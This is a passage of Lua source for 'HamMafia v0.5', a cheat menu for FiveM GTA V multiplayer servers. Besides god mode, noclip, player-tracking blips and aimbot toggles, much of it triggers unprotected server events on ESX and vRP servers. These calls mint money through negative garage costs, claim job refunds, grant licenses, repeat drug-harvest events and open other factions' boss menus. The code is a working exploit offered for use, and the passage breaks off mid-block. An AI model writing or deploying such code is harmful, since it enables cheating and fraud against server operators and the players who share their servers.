			local playerPed = GetPlayerPed(-1)
			local playerID = PlayerId()
			if playerPed then
				RestorePlayerStamina(playerID, 1.0)
			end
		end

		if KeepClean then
			local playerPed = GetPlayerPed(-1)
			local playerID = PlayerId()
			if playerPed then
				ClearPedBloodDamage(playerPed)
			end
		end

		if RainbowVeh then
			local ra = RGBRainbow(1.0)
			SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
			SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
		end

		if Noclip then
			local currentSpeed = 2
			local noclipEntity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
			FreezeEntityPosition(PlayerPedId(), true)
			SetEntityInvincible(PlayerPedId(), true)

			local newPos = GetEntityCoords(entity)

			DisableControlAction(0, 32, true) --MoveUpOnly
			DisableControlAction(0, 268, true) --MoveUp

			DisableControlAction(0, 31, true) --MoveUpDown

			DisableControlAction(0, 269, true) --MoveDown
			DisableControlAction(0, 33, true) --MoveDownOnly

			DisableControlAction(0, 266, true) --MoveLeft
			DisableControlAction(0, 34, true) --MoveLeftOnly

			DisableControlAction(0, 30, true) --MoveLeftRight

			DisableControlAction(0, 267, true) --MoveRight
			DisableControlAction(0, 35, true) --MoveRightOnly

			DisableControlAction(0, 44, true) --Cover
			DisableControlAction(0, 20, true) --MultiplayerInfo

			local yoff = 0.0
			local zoff = 0.0

			if GetInputMode() == "MouseAndKeyboard" then
				if IsDisabledControlPressed(0, 32) then
					yoff = 0.5
				end
				if IsDisabledControlPressed(0, 33) then
					yoff = -0.5
				end
				if IsDisabledControlPressed(0, 34) then
					SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) + 3.0)
				end
				if IsDisabledControlPressed(0, 35) then
					SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) - 3.0)
				end
				if IsDisabledControlPressed(0, 44) then
					zoff = 0.21
				end
				if IsDisabledControlPressed(0, 20) then
					zoff = -0.21
				end
			end

			newPos = GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))

			local heading = GetEntityHeading(noclipEntity)
			SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
			SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
			SetEntityHeading(noclipEntity, heading)

			SetEntityCollision(noclipEntity, false, false)
			SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)

			FreezeEntityPosition(noclipEntity, false)
			SetEntityInvincible(noclipEntity, false)
			SetEntityCollision(noclipEntity, true, true)
		end
	end
end)

Citizen.CreateThread(function() 
	local headId = {}
	while true do
		Citizen.Wait(1)
		if blips1 then
			-- show blips
			for id = 0, 256 do
				if NetworkIsPlayerActive(id) and GetPlayerPed(id) ~= GetPlayerPed(-1) then
					ped = GetPlayerPed(id)
					blip = GetBlipFromEntity(ped)

					-- HEAD DISPLAY STUFF --

					-- Create head display (this is safe to be spammed)
					headId[id] = CreateMpGamerTag(ped, GetPlayerName( id ), false, false, "", false)
					wantedLvl = GetPlayerWantedLevel(id)

					-- Wanted level display
					if wantedLvl then
						SetMpGamerTagVisibility(headId[id], 7, true) -- Add wanted sprite
						SetMpGamerTagWantedLevel(headId[id], wantedLvl) -- Set wanted number
					else
						SetMpGamerTagVisibility(headId[id], 7, false)
					end

					-- Speaking display
					if NetworkIsPlayerTalking(id) then
						SetMpGamerTagVisibility(headId[id], 9, true) -- Add speaking sprite
					else
						SetMpGamerTagVisibility(headId[id], 9, false) -- Remove speaking sprite
					end

					-- BLIP STUFF --

					if not DoesBlipExist(blip) then -- Add blip and create head display on player
						blip = AddBlipForEntity(ped)
						SetBlipSprite(blip, 1)
						ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
					else -- update blip
						veh = GetVehiclePedIsIn(ped, false)
						blipSprite = GetBlipSprite(blip)
						if not GetEntityHealth(ped) then -- dead
							if blipSprite ~= 274 then
								SetBlipSprite(blip, 274)
								ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
							end
						elseif veh then
							vehClass = GetVehicleClass(veh)
							vehModel = GetEntityModel(veh)
							if vehClass == 15 then -- Helicopters
								if blipSprite ~= 422 then
									SetBlipSprite(blip, 422)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehClass == 8 then -- Motorcycles
								if blipSprite ~= 226 then
									SetBlipSprite(blip, 226)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehClass == 16 then -- Plane
								if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then -- Jets
									if blipSprite ~= 424 then
										SetBlipSprite(blip, 424)
										ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
									end
								elseif blipSprite ~= 423 then
									SetBlipSprite(blip, 423)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehClass == 14 then -- Boat
								if blipSprite ~= 427 then
									SetBlipSprite(blip, 427)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then -- Insurgent, Insurgent Pickup & Insurgent Pickup Custom
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("limo2") then -- Turreted Limo
								if blipSprite ~= 460 then
									SetBlipSprite(blip, 460)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("rhino") then -- Tank
								if blipSprite ~= 421 then
									SetBlipSprite(blip, 421)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then -- Trash
								if blipSprite ~= 318 then
									SetBlipSprite(blip, 318)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("pbus") then -- Prison Bus
								if blipSprite ~= 513 then
									SetBlipSprite(blip, 513)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then -- Speedophiles
								if blipSprite ~= 471 then
									SetBlipSprite(blip, 471)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
								if blipSprite ~= 481 then
									SetBlipSprite(blip, 481)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("taxi") then -- Cab/ Taxi
								if blipSprite ~= 198 then
									SetBlipSprite(blip, 198)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
								or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
								or vehModel == GetHashKey("policeold2") or vehModel == GetHashKey("policeold1") then
								if blipSprite ~= 56 then
									SetBlipSprite(blip, 56)
									ShowHeadingIndicatorOnBlip(blip, false) -- Player Blip indicator
								end
							elseif blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
							end

							-- Show number in case of passangers
							passengers = GetVehicleNumberOfPassengers(veh)

							if passengers then
								if not IsVehicleSeatFree(veh, -1) then
									passengers = passengers + 1
								end
								ShowNumberOnBlip(blip, passengers)
							else
								HideNumberOnBlip(blip)
							end
						else
							-- Remove leftover number
							HideNumberOnBlip(blip)
							if blipSprite ~= 1 then -- default blip
								SetBlipSprite(blip, 1)
								ShowHeadingIndicatorOnBlip(blip, true) -- Player Blip indicator
							end
						end
						
						SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) -- update rotation
						SetBlipNameToPlayerName(blip, id) -- update blip name
						SetBlipScale(blip,  0.85) -- set scale

						-- set player alpha
						if IsPauseMenuActive() then
							SetBlipAlpha( blip, 255 )
						else
							x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
							x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
							distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
							-- Probably a way easier way to do this but whatever im an idiot

							if distance < 0 then
								distance = 0
							elseif distance > 255 then
								distance = 255
							end
							SetBlipAlpha(blip, distance)
						end
					end
				end
			end
		else
			for id = 0, 256 do
				ped = GetPlayerPed(id)
				blip = GetBlipFromEntity(ped)
				if DoesBlipExist(blip) then -- Removes blip
					RemoveBlip(blip)
				end
				if IsMpGamerTagActive(headId[id]) then
					RemoveMpGamerTag(headId[id])
				end
			end
		end
	end
end)

Citizen.CreateThread(function()
	local blips = {}
	local currentPlayer = PlayerId()
	while true do
		Wait(100)
		local players = GetPlayers()
		if blips2 then
			for player = 0, 256 do
				if player ~= currentPlayer and NetworkIsPlayerActive(player) then
					local playerPed = GetPlayerPed(player)
					local playerName = GetPlayerName(player)
					RemoveBlip(blips[player])
					local new_blip = AddBlipForEntity(playerPed)
					ped = GetPlayerPed( id )
					blip = GetBlipFromEntity( ped )
					SetBlipSprite(new_blip, 1 )
					-- Enable text on blip
					SetBlipCategory(new_blip, 2)
					-- Add player name to blip
					SetBlipNameToPlayerName(new_blip, player)
					--SetBlipNameToPlayerName( blip, id ) -- update blip name
					SetBlipRotation( blip, math.ceil( GetEntityHeading( veh ) ) ) -- update rotation
					-- Shrink player blips slightly
					SetBlipScale(new_blip, 1.2)
					-- Add nametags above head
					Citizen.InvokeNative(0xBFEFE3321A3F5015, playerPed, playerName, false, false, '', false)
					-- Record blip so we don't keep recreating it
					blips[player] = new_blip
				end
			end
		end
	end
end)


Citizen.CreateThread(function()
	FreezeEntityPosition(entity, false)
	local currentItemIndex = 1
	local selectedItemIndex = 1
		
	local IsESXPresent = RunningESX()


	xnsadifnias.CreateMenu('MainMenu', 'HamMafia v0.5')
	xnsadifnias.SetSubTitle('MainMenu', 'https://dc.xaries.pl')
	xnsadifnias.CreateSubMenu('SelfMenu', 'MainMenu', 'Self Options ~b~>~s~')
    xnsadifnias.CreateSubMenu('VehMenu', 'MainMenu', 'Vehicle Options ~b~>~s~')
	xnsadifnias.CreateSubMenu('VehMenu2', 'MainMenu', 'Vehicle Custom ~b~>~s~')
	xnsadifnias.CreateSubMenu('Engine', 'VehMenu2', 'Engine Custom ~b~>~s~')
	xnsadifnias.CreateSubMenu('Brake', 'VehMenu2', 'Engine Custom ~b~>~s~')
	xnsadifnias.CreateSubMenu('Transmission', 'VehMenu2', 'Engine Custom ~b~>~s~')
	xnsadifnias.CreateSubMenu('Turbo', 'VehMenu2', 'Engine Custom ~b~>~s~')
	xnsadifnias.CreateSubMenu('ServerMenu', 'MainMenu', 'Lua menu ~b~>~s~')
	xnsadifnias.CreateSubMenu('PlayerMenu', 'MainMenu', 'Player Options ~b~>~s~')
	xnsadifnias.CreateSubMenu('OnlinePlayerMenu', 'PlayerMenu', 'Online Player Menu ~b~>~s~')
	xnsadifnias.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options ~b~>~s~')
	xnsadifnias.CreateSubMenu('SingleWepPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu ~b~>~s~')
	xnsadifnias.CreateSubMenu('WepMenu', 'MainMenu', 'Weapon Menu ~b~>~s~')
	xnsadifnias.CreateSubMenu('SingleWepMenu', 'WepMenu', 'Single Weapon Menu ~b~>~s~')
	xnsadifnias.CreateSubMenu('ESXOptions', 'ServerMenu', 'ESX Specific Options ~b~>~s~')
	xnsadifnias.CreateSubMenu('ESXdrugs', 'ServerMenu', 'ESX Drugs ~b~>~s~')
	xnsadifnias.CreateSubMenu('TrollOptions', 'ServerMenu', 'Custom Scripts ;) ~b~>~s~')
	xnsadifnias.CreateSubMenu('MiscServerOptions', 'ServerMenu', 'Misc Server Options ~b~>~s~')
	xnsadifnias.CreateSubMenu('VRPOptions', 'ServerMenu', 'VRP Specific Options ~b~>~s~')

	local SelectedPlayer

	while Enabled do
		if xnsadifnias.IsMenuOpened('MainMenu') then

			drawNotification("HamMafia private ~p~menu ~g~Check my ~b~discord~s~ ∑")
			if xnsadifnias.MenuButton('Self Options ~b~>~s~', 'SelfMenu') then
            elseif xnsadifnias.MenuButton('Vehicle Options ~b~>~s~', 'VehMenu') then
            elseif xnsadifnias.MenuButton('Vehicle Custom ~b~>~s~', 'VehMenu2') then
			elseif xnsadifnias.MenuButton('Player Options ~b~>~s~', 'PlayerMenu') then
			elseif xnsadifnias.MenuButton('Weapon Menu ~b~>~s~', 'WepMenu') then
			elseif xnsadifnias.MenuButton('Server Specific Options ~b~>~s~', 'ServerMenu') then
			elseif xnsadifnias.Button('~r~~h~Panic Key~s~ / ~r~Disable Menu') then
				Enabled = false
			elseif xnsadifnias.Button("~b~https://dc.xaries.pl") then
			end

			xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened('SelfMenu') then
			if xnsadifnias.CheckBox('God Mode', Godmode, function(enabled)
					Godmode = enabled
				end) then
			elseif xnsadifnias.Button('Heal Self') then
				SetEntityHealth(PlayerPedId(), 200)
			elseif xnsadifnias.Button('Give Armour') then 
				SetPedArmour(PlayerPedId(), 200)
			elseif xnsadifnias.Button('Teleport to waypoint') then
				TeleportToWaypoint()
			elseif xnsadifnias.Button('Suicide') then
				SetEntityHealth(PlayerPedId(), 0)
				drawNotification("~r~You Committed Suicide.")
			elseif xnsadifnias.CheckBox('Infinite Stamania', Stamania, function(enabled)
					Stamania = enabled
					
				end) then
			elseif xnsadifnias.CheckBox('Keep Clean', KeepClean, function(enabled)
					KeepClean = enabled
					
				end) then
			elseif xnsadifnias.CheckBox('Noclip', Noclip, function(enabled)
					Noclip = enabled
				
				end) then
			end

			xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened("WepMenu") then
			if xnsadifnias.Button("Give All Weapons") then
				for player=1, #allWeapons do
					GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[player]), 1000, false, false)
				end
			elseif xnsadifnias.Button('Remove All Weapon') then
				for player=1, #allWeapons do
					RemoveWeaponFromPed(PlayerPedId(), GetHashKey(allWeapons[player]))
				end
			elseif xnsadifnias.Button('Give Ammo') then
				for player=1, #allWeapons do
					AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[player]), 200)
				end
			elseif xnsadifnias.MenuButton('Give Specific Weapon', "SingleWepMenu") then
			elseif xnsadifnias.ComboBox('Weapon/Melee Damage', { "1x (Default)", "2x", "3x", "4x", "5x" }, currentItemIndex, selectedItemIndex, function(currentIndex, selectedIndex)
					currentItemIndex = currentIndex
					selectedItemIndex = selectedIndex

					SetPlayerWeaponDamageModifier(PlayerId(), selectedItemIndex)
					SetPlayerMeleeWeaponDamageModifier(PlayerId(), selectedItemIndex)

				end) then
			elseif xnsadifnias.CheckBox('Infinite Ammo', InfAmmo, function(enabled)
					InfAmmo = enabled
					
					SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
				end) then
			elseif xnsadifnias.CheckBox('Trigger Bot ~h~~r~[PLAYER ONLY]', TriggerBot, function(enabled)
					TriggerBot = enabled
				end) then
			elseif xnsadifnias.CheckBox('Aim Bot ~h~~r~[PLAYER ONLY]', AimBot, function(enabled)
					AimBot = enabled
				end) then
			end
			
			xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened("SingleWepMenu") then
			for player=1, #allWeapons do
				if xnsadifnias.Button(allWeapons[player]) then
					GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[player]), 1000, false, false)
				end
			end

			xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened('VehMenu') then
			if xnsadifnias.Button('Spawn Vehicle') then
				local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
				if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
					RequestModel(ModelName)
					while not HasModelLoaded(ModelName) do
						Citizen.Wait(0)
					end

					local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)

					SetPedIntoVehicle(PlayerPedId(), veh, -1)
				else
					drawNotification("~r~Model is not valid!")
                end
			elseif xnsadifnias.Button('Max out') then
				MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
			elseif xnsadifnias.Button('make vehicle dirty') then
				Clean(GetVehiclePedIsUsing(PlayerPedId()))
				drawNotification("Vehicle is now dirty")
			elseif xnsadifnias.Button('Make vehicle clean') then
				Clean2(GetVehiclePedIsUsing(PlayerPedId()))
				drawNotification("Vehicle is now clean")
			elseif xnsadifnias.CheckBox('No Fall Off', Nofall, function(enabled)
					Nofall = enabled

					SetPedCanBeKnockedOffVehicle(PlayerPedId(), Nofall)
				end) then

			elseif xnsadifnias.CheckBox('Vehicle Godmode', VehGod, function(enabled)
					VehGod = enabled
				end) then
					
			elseif xnsadifnias.CheckBox('Vehicle Speedboost (Num9 + Num6)', VehSpeed, function(enabled)
					VehSpeed = enabled
				end) then

			elseif xnsadifnias.CheckBox('Rainbow Veh', RainbowVeh, function(enabled)
					RainbowVeh = enabled
				end) then

			elseif xnsadifnias.Button('Repair Vehicle') then
				SetVehicleFixed(GetVehiclePedIsUsing(PlayerPedId()))
			elseif xnsadifnias.Button('Engine Power boost reset') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
			elseif xnsadifnias.Button('Engine Power boost ~h~~g~x2') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
			elseif xnsadifnias.Button('Engine Power boost  ~h~~g~x3') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3.0 * 20.0)
			elseif xnsadifnias.Button('Engine Power boost  ~h~~g~x4') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
			elseif xnsadifnias.Button('Engine Power boost  ~h~~g~x5') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5.0 * 20.0)
			end
			
			xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened('VehMenu2') then
			if xnsadifnias.MenuButton('Engine Custom ( BETA ) ~b~>~s~', 'Engine') then
			elseif xnsadifnias.MenuButton('Brake Custom', 'Brake ~b~>~s~') then
			elseif xnsadifnias.MenuButton('Transmission Custom ~b~>~s~', 'Transmission') then
			elseif xnsadifnias.MenuButton('Tubro ON OFF ~b~>~s~', 'Turbo') then
			elseif xnsadifnias.MenuButton('Soon 4', 'Soon') then
			end
            
            xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened('Engine') then 
			if xnsadifnias.Button('~g~Engine Level 1') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				SetVehicleMod(veh, 11, 1, 0)
			elseif xnsadifnias.Button('~g~Engine Level 2') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				SetVehicleMod(veh, 11, 2, 0)
			elseif xnsadifnias.Button('~g~Engine Level 3') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				SetVehicleMod(veh, 11, 3, 0)
			elseif xnsadifnias.Button('~g~Engine Level 4') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				SetVehicleMod(veh, 11, 4, 0)
			elseif xnsadifnias.Button('~g~Engine Level 5') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				SetVehicleMod(veh, 11, 5, 0)
			end

			xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened('Brake') then 
			if xnsadifnias.Button('~g~Brake Level 1') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				SetVehicleMod(veh, 12, 1, 0)
			elseif xnsadifnias.Button('~g~Brake Level 2') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				SetVehicleMod(veh, 12, 2, 0)
			elseif xnsadifnias.Button('~g~Brake Level 3') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				SetVehicleMod(veh, 12, 3, 0)
			elseif xnsadifnias.Button('~g~Brake Level 4') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				SetVehicleMod(veh, 12, 4, 0)
			elseif xnsadifnias.Button('~g~Brake Level 5') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				SetVehicleMod(veh, 12, 5, 0)
			end

			xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened('Transmission') then 
			if xnsadifnias.Button('~g~Transmission Level 1') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				SetVehicleMod(veh, 13, 1, 0)
			elseif xnsadifnias.Button('~g~Transmission Level 2') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				SetVehicleMod(veh, 13, 2, 0)
			elseif xnsadifnias.Button('~g~Transmission Level 3') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				SetVehicleMod(veh, 13, 3, 0)
			elseif xnsadifnias.Button('~g~Transmission Level 4') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				SetVehicleMod(veh, 13, 4, 0)
			elseif xnsadifnias.Button('~g~Transmission Level 5') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				SetVehicleMod(veh, 13, 5, 0)
			end
		
			xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened('Turbo') then 
			if xnsadifnias.Button('~g~Turbo ON') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				ToggleVehicleMod(veh, 18, 1, 0)
			elseif xnsadifnias.Button('~g~Turbo OFF') then
				local veh = GetVehiclePedIsUsing(PlayerPedId())
				ToggleVehicleMod(veh, 18, 0, 0)
			end

			xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened('ServerMenu') then
			if xnsadifnias.MenuButton('ESX Server Options ~b~>~s~', 'ESXOptions') then
			elseif xnsadifnias.MenuButton('ESX Drugs ~b~>~s~', 'ESXdrugs') then
			elseif xnsadifnias.MenuButton('Troll Options :) ~b~>~s~', 'TrollOptions') then
			elseif xnsadifnias.MenuButton('VRP Specific Options ~b~>~s~', 'VRPOptions') then
			elseif xnsadifnias.MenuButton('Misc Options ~b~>~s~', 'MiscServerOptions') then
			end
				
				
			xnsadifnias.Display()	
		elseif xnsadifnias.IsMenuOpened('ESXOptions') then
			if xnsadifnias.Button('~g~Set hunger to 100%') then
				TriggerEvent("esx_status:set", "hunger", 1000000)
			elseif xnsadifnias.Button('~g~Set thirst to 100%') then
			TriggerEvent("esx_status:set", "thirst", 1000000)
			elseif xnsadifnias.Button('~o~ESX Ambulance Revive') then
				TriggerEvent('esx_ambulancejob:revive')
			elseif xnsadifnias.Button('~g~Mecano : Finish NPC Mission') then
				TriggerServerEvent('esx_mecanojob:onNPCJobCompleted')
			elseif xnsadifnias.Button('~g~Get all Driver lisence ~h~~r~[BETA]') then
				TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
				TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
				TriggerServerEvent('esx_dmvschool:addLicense', 'drive_bike')
				TriggerServerEvent('esx_dmvschool:addLicense', 'drive_truck')
			elseif xnsadifnias.Button('~o~Open Mecano boss menu') then
				TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
				setMenuVisible(currentMenu, false)
			elseif xnsadifnias.Button('~o~Open police boss menu') then
				TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
				setMenuVisible(currentMenu, false)
			elseif xnsadifnias.Button('~o~Open Ambulance boss menu') then
				TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
				setMenuVisible(currentMenu, false)
			elseif xnsadifnias.Button('~o~Open Taxi boss menu') then
				TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
				setMenuVisible(currentMenu, false)
			elseif xnsadifnias.Button('~o~Open Real State Agent boss menu') then 
				TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
				setMenuVisible(currentMenu, false)
			elseif xnsadifnias.Button('~o~ESX jobs caution 10 000$') then
				TriggerServerEvent('esx_jobs:caution', 'give_back', 10000)
			elseif xnsadifnias.Button('~o~ESX jobs caution 25 000$') then
				TriggerServerEvent('esx_jobs:caution', 'give_back', 25000)
			elseif xnsadifnias.Button('~o~ESX jobs caution 100 000$') then
				TriggerServerEvent('esx_jobs:caution', 'give_back', 100000)
			elseif xnsadifnias.Button('~g~Harvest Fixkit') then
				TriggerServerEvent('esx_mechanicjob:startHarvest')
			elseif xnsadifnias.Button('~g~Craft Fixkit') then
				TriggerServerEvent('esx_mechanicjob:startCraft')
			end

			
			xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened('MiscServerOptions') then 
			if xnsadifnias.Button('Send Discord Message (DiscordBot)') then
				local Message = KeyboardInput("Enter message to send", "", 100)
				TriggerServerEvent('DiscordBot:playerDied', Message, '1337')
				drawNotification("The message:~n~"..Message.."~n~Has been ~g~sent!")
			end

			xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened('VRPOptions') then 
			if xnsadifnias.Button('Give Money ( payGarage ) 100$') then
				TriggerServerEvent('lscustoms:payGarage', {costs = -100})
			elseif xnsadifnias.Button('Give Money ~y~( payGarage ) 1000$') then
				TriggerServerEvent('lscustoms:payGarage', {costs = -1000})
			elseif xnsadifnias.Button('Give Money ~y~( payGarage ) 10 000$') then
				TriggerServerEvent('lscustoms:payGarage', {costs = -10000})
			elseif xnsadifnias.Button('Give Money ~y~( payGarage ) 100 000$') then
				TriggerServerEvent('lscustoms:payGarage', {costs = -100000})
			elseif xnsadifnias.Button('Get driver liscence') then
				TriggerServerEvent('dmv:success')
			elseif xnsadifnias.Button('Bank Deposit 100 000$') then
				TriggerServerEvent('bank:deposit', 100000)
			elseif xnsadifnias.Button('Bank Whithdraw 100 000$') then
				TriggerServerEvent('bank:withdraw', 100000)
			elseif xnsadifnias.Button('Slot Machine 1000$') then
				TriggerServerEvent('vrp_slotmachine:server:2', 1000 )
			end

			xnsadifnias.Display()
		elseif xnsadifnias.IsMenuOpened('ESXdrugs') then
			if xnsadifnias.Button('Harvest Weed ~c~(x5)') then 
				TriggerServerEvent('esx_drugs:startHarvestWeed')
				TriggerServerEvent('esx_drugs:startHarvestWeed')
				TriggerServerEvent('esx_drugs:startHarvestWeed')
				TriggerServerEvent('esx_drugs:startHarvestWeed')
				TriggerServerEvent('esx_drugs:startHarvestWeed')
			elseif xnsadifnias.Button('Transform Weed ~c~(x5)') then
				TriggerServerEvent('esx_drugs:startTransformWeed')
				TriggerServerEvent('esx_drugs:startTransformWeed')
				TriggerServerEvent('esx_drugs:startTransformWeed')
				TriggerServerEvent('esx_drugs:startTransformWeed')
				TriggerServerEvent('esx_drugs:startTransformWeed')
			elseif xnsadifnias.Button('Sell Weed ~c~(x5)') then
				TriggerServerEvent('esx_drugs:startSellWeed')
				TriggerServerEvent('esx_drugs:startSellWeed')
				TriggerServerEvent('esx_drugs:startSellWeed')
				TriggerServerEvent('esx_drugs:startSellWeed')
				TriggerServerEvent('esx_drugs:startSellWeed')
			elseif xnsadifnias.Button('Harvest Coke ~c~(x5)') then 
				TriggerServerEvent('esx_drugs:startHarvestCoke')
				TriggerServerEvent('esx_drugs:startHarvestCoke')
				TriggerServerEvent('esx_drugs:startHarvestCoke')
				TriggerServerEvent('esx_drugs:startHarvestCoke')
				TriggerServerEvent('esx_drugs:startHarvestCoke')
			elseif xnsadifnias.Button('Transform Coke ~c~(x5)') then
				TriggerServerEvent('esx_drugs:startTransformCoke')
				TriggerServerEvent('esx_drugs:startTransformCoke')
				TriggerServerEvent('esx_drugs:startTransformCoke')
				TriggerServerEvent('esx_drugs:startTransformCoke')
				TriggerServerEvent('esx_drugs:startTransformCoke')
			elseif xnsadifnias.Button('Sell Coke ~c~(x5)') then
				TriggerServerEvent('esx_drugs:startSellCoke')
				TriggerServerEvent('esx_drugs:startSellCoke')
				TriggerServerEvent('esx_drugs:startSellCoke')
				TriggerServerEvent('esx_drugs:startSellCoke')
				TriggerServerEvent('esx_drugs:startSellCoke')
			elseif xnsadifnias.Button('Harvest Meth ~c~(x5)') then 
				TriggerServerEvent('esx_drugs:startHarvestMeth')
				TriggerServerEvent('esx_drugs:startHarvestMeth')
				TriggerServerEvent('esx_drugs:startHarvestMeth')
				TriggerServerEvent('esx_drugs:startHarvestMeth')
				TriggerServerEvent('esx_drugs:startHarvestMeth')
			elseif xnsadifnias.Button('Transform Meth ~c~(x5)') then
				TriggerServerEvent('esx_drugs:startTransformMeth')
				TriggerServerEvent('esx_drugs:startTransformMeth')
				TriggerServerEvent('esx_drugs:startTransformMeth')
				TriggerServerEvent('esx_drugs:startTransformMeth')
				TriggerServerEvent('esx_drugs:startTransformMeth')
